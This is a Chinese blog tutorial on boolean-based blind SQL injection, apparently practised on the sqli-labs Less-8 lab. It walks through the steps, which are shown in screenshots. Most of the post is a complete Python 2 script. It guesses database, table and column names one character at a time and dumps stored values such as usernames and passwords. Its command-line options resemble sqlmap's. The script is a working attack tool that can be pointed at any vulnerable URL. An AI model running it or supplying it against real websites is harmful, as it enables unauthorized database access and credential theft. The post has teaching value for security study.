+++
date = "2016-06-22T23:32:34+08:00"
description = ""
draft = false
tags = ["injection"]
title = "SQL注入之布尔型注入"
topics = ["Pentest"]

+++

### 0x00 特点
> ```
当页面存在注入，但是没有显示位，且没有用echo "mysql_error()"输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
```

### 0x01 利用方式
> ```
用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
```

### 0x02 注入步骤
* 找注入点、猜闭合字符
* 猜解列数、尝试得到显示位
* 猜数据库名
* 猜表名
* 猜列名
* 猜列值

#### 找到注入点，判断闭合字符
> {{% fluid_img src="/img/post/sqli8_get_closed_character.png" alt="得到闭合字符.png" %}}

#### 尝试猜解列数，得到显示位
> {{% fluid_img src="/img/post/sqli8_order_by.png" alt="猜解列数.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_display_point.png" alt="尝试得到显示位.png" %}}

#### 得到数据库名
> {{% fluid_img src="/img/post/sqli8_get_db_num.png" alt="猜解数据库数量.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_get_db_name_char.png" alt="猜第5个数据库第2个字符.png" %}}
```
最终得到第五个数据库名为security
```

#### 得到表名
> {{% fluid_img src="/img/post/sqli8_get_table_num_name_len.png" alt="猜解表的数量和第4张表的表名长度.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_get_table_name_char.png" alt="猜第4个表第1个字符.png" %}}
```
最终依次猜的表名为users
```

#### 得到列名
> {{% fluid_img src="/img/post/sqli8_get_column_num.png" alt="猜解有几列.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_get_column_name_len.png" alt="猜解users表第2列列名的长度.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_get_column_name_one_char.png" alt="猜测users表第2列列名的第1个字符.png" %}}
```
同理最终得到第2列列名为username，第3列列名为password
```

#### 得到列值
> {{% fluid_img src="/img/post/sqli8_get_column_value_num.png" alt="猜解数据条数.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_get_column_value_len.png" alt="猜解第13条数据username字段值的长度.png" %}}
<br /><br />
{{% fluid_img src="/img/post/sqli8_get_column_value_char.png" alt="猜解第13条数据username字段值的前两个字符.png" %}}<br />
```
依次得到为admin4，同理可得其他数据
```

### 0x04 附上python脚本
> ```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-  

__author__="reber"

import sys
import urllib
import urllib2
import binascii
import hashlib
from pyfiglet import figlet_format
from optparse import OptionParser


def get_md5_html(url):
    response = urllib2.urlopen(url)
    html = response.read()

    m2 = hashlib.md5()
    m2.update(html)
    md5_html = m2.hexdigest()

    return md5_html

def getAllDatabases(url):
	# global aa
    # print "getAllDatabases"
    # print url
    standard_md5 = get_md5_html(url)
    # print standard_md5

    low = 1
    high = 100
    while low <= high:  #循环结束后得到数据库个数
        mid = (low + high)/2;

        payload = "' and ((select count(distinct+table_schema) from information_schema.tables) > %d)--+" % mid
        # payload = ("%s" % aa).join(payload.split())
        payload = "/**/".join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        db_num = (low+high+1)/2
    print "The total number of database is: %d" % db_num
    for index in xrange(0,db_num):  #一次循环输出一个数据库名
        low = 1
        high = 30

        while low <= high:  #循环结束后得到数据库名的长度
            mid = (low + high)/2

            payload = "' and (length((select distinct table_schema from information_schema.tables limit %d,1)) > %d)--+" % (index,mid)
            # print payload
            payload = "/**/".join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            db_name_len = (low+high+1)/2
        # print "database name length:%d" % db_name_len
        print "\tdatabase name is: ",
        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符
            low = 32
            high = 126
            while low <= high: #循环结束后得到数据库名的一个字符的ASCII码
                mid = (low + high)/2
                payload = "' and (select ascii(substr((select distinct table_schema from information_schema.tables limit %d,1), %d, 1)) > %d) --+" % (index,x,mid)
                # print payload
                payload = "/**/".join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            database_name_one_str = chr(str_ascii)
            sys.stdout.write(database_name_one_str)
            sys.stdout.flush()
        print

def getAllTablesByDb(url,db_name):
    # print "getAllTablesByDb"
    # print url
    # print db_name
    standard_md5 = get_md5_html(url)
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 200
    while low <= high:  #循环结束后得到表个数
        mid = (low + high)/2;

        payload = "' and ((select count(distinct+table_name) from information_schema.tables where table_schema=%s) > %d)--+" % (db_name_hex,mid)
        payload = "/**/".join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        db_num = (low+high+1)/2

    print "Database security contains %d table:" % db_num
    for index in xrange(0,db_num):  #一次循环输出一个表名
        low = 1
        high = 30

        while low <= high:  #循环结束后得到表名的长度
            mid = (low + high)/2

            payload = "' and (length((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1)) > %d)--+" % (db_name_hex,index,mid)
            # print payload
            payload = "/**/".join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            table_name_len = (low+high+1)/2
        # print db_name_len
        print "\ttable name is: ",
        for x in xrange(1,table_name_len+1):   #一次for循环输出表名的一个字符
            low = 32
            high = 126
            while low <= high: #循环结束后得到表名的一个字符的ASCII码
                mid = (low + high)/2
                payload = "' and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1), %d, 1)) > %d) --+" % (db_name_hex,index,x,mid)
                # print payload
                payload = "/**/".join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            table_name_one_str = chr(str_ascii)
            sys.stdout.write(table_name_one_str)
            sys.stdout.flush()
        print 

def getAllColumnsByTable(url,table_name,db_name):
    # print "getAllColumnsByTable"
    #while循环结束后得到列的个数
    #for循环，一次得到一列的列名：
        #while循环得到列名的长度：
        #for循环，一次得出列名的一个字符
    # print url
    # print table_name
    # print db_name
    standard_md5 = get_md5_html(url)
    table_name_hex = "0x" + binascii.b2a_hex(table_name)
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 100
    while low <= high:  #循环结束后得到列个数
        mid = (low + high)/2;

        payload = "' and ((select count(distinct+column_name) from information_schema.columns where table_name=%s and table_schema=%s) > %d)--+" % (table_name_hex,db_name_hex,mid)
        # print payload
        payload = "/**/".join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        column_num = (low+high+1)/2
    print "Table %s contains %d columns:" % (table_name,column_num)
    for index in xrange(0,column_num):  #一次循环输出一个列名
        low = 1
        high = 30

        while low <= high:  #循环结束后得到列名的长度
            mid = (low + high)/2

            payload = "' and (length((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) > %d)--+" % (table_name_hex,db_name_hex,index,mid)
            # print payload
            payload = "/**/".join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            column_name_len = (low+high+1)/2
        # print "column length is: %d" % column_name_len
        print "\tcolumn name is: ",
        for x in xrange(1,column_name_len+1):   #一次for循环输出列名的一个字符
            low = 32
            high = 126
            while low <= high: #循环结束后得到列名的一个字符的ASCII码
                mid = (low + high)/2
                payload = "' and (select ascii(substr((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1), %d, 1)) > %d) --+" % (table_name_hex,db_name_hex,index,x,mid)
                # print payload
                payload = "/**/".join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            column_name_one_str = chr(str_ascii)
            sys.stdout.write(column_name_one_str)
            sys.stdout.flush()
        print

def getAllcontent(url,column_name,table_name,db_name):
    # print "getAllcontent"
    #while循环结束后得到结果的行数
    #for循环，一次得到一行的值
        #while循环得到每个字段的长度
        #for循环，一次得出一个字段的一个字符
    # print url
    # print column_name
    # print table_name
    # print db_name
    column_name = column_name.split(',')
    len_column_name = len(column_name)
    # print "len_column_name:%d" % len_column_name
    standard_md5 = get_md5_html(url)
    table_name_hex = "0x" + binascii.b2a_hex(table_name)
    db_name_hex = "0x" + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 10000
    while low <= high:  #循环结束后得到列个数
        mid = (low + high)/2;

        payload = "' and ((select count(*) from %s.%s) > %d)--+" % (db_name,table_name,mid)
        # print payload
        payload = "/**/".join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        column_value_num = (low+high+1)/2
    print "The %s table with %d row value: " % (table_name,column_value_num)
    stri = ""
    for x in xrange(0,len_column_name):#输出title
        stri += "%s\t" % column_name[x]
    print stri
    for index in xrange(0,column_value_num):  #一次循环输出一行数据
        for y in xrange(0,len_column_name):  #一次输出一行的一列的值,循环完输出一行的值
            low = 1
            high = 30
            # print "len_column_name:%s" % column_name[y]
            while low <= high:  #循环结束后得到一行数据的一列值的长度
                mid = (low + high)/2

                payload = "' and (length((select %s from %s.%s limit %d,1)) > %d)--+" % (column_name[y],db_name,table_name,index,mid)
                # print payload
                payload = "/**/".join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                column_value_len = (low+high+1)/2
            # print "column value length is: %d" % column_value_len
            # print "\tcolumn name is: ",
            for x in xrange(1,column_value_len+1): #得到一行数据的一列的值
                low = 32
                high = 126
                while low <= high: #得到一行数据的一列值的单个字符ASCII码
                    mid = (low + high)/2
                    payload = "' and (select ascii(substr((select %s from %s.%s limit %d,1), %d, 1)) > %d) --+" % (column_name[y],db_name,table_name,index,x,mid)
                    # print payload
                    payload = "/**/".join(payload.split())
                    mid_url = url + payload
                    mid_md5_html = get_md5_html(mid_url)

                    if standard_md5 == mid_md5_html:
                        low = mid + 1
                    else:
                        high = mid-1

                    str_ascii = (low+high+1)/2
                column_name_one_str = chr(str_ascii)
                sys.stdout.write(column_name_one_str)
                sys.stdout.flush()
            sys.stdout.write("\t")
        print


def main():
    print figlet_format("sqli-bool")
    parser = OptionParser()
    parser.add_option("-u","--URL",action="store",
              type="string",dest="url",
              help="get url")
    parser.add_option("-D","--DB",action="store",
              type="string",dest="db_name",
              help="get database name")
    parser.add_option("-T","--TBL",action="store",
              type="string",dest="table_name",
              help="get table name")
    parser.add_option("-C","--COL",action="store",
              type="string",dest="column_name",
              help="get column name")

    parser.add_option("--dbs",action="store_true",
              dest="dbs",help="get all database name")
    parser.add_option("--current-db",action="store_true",
              dest="current_db",help="get current database name")
    parser.add_option("--current-user",action="store_true",
              dest="current_user",help="get current user name")
    parser.add_option("--tables",action="store_true",
              dest="tables",help="get tables from databases")
    parser.add_option("--columns",action="store_true",
              dest="columns",help="get columns from tables")
    parser.add_option("--dump",action="store_true",
              dest="dump",help="get value")
    (options,args) = parser.parse_args()


    if options == None or options.url == None:
        parser.print_help()
    elif options.dump and options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.current_db:
        getCurrentDb(options.url)
    elif options.current_user:
        getCurrentUser(options.url)
    elif options.url:
        print "you input: sqli-error.py -u %s" % options.url


if __name__ == '__main__':
    main()
    # getAllDatabases("http://192.168.188.134/sqli/Less-8/?id=1")
    # getAllTablesByDb("http://192.168.188.134/sqli/Less-8/?id=1","security")
    # getAllColumnsByTable("http://192.168.188.134/sqli/Less-8/?id=1","user","mysql")
    # getAllcontent("http://192.168.188.134/sqli/Less-8/?id=1","id,username,password","users","security")
```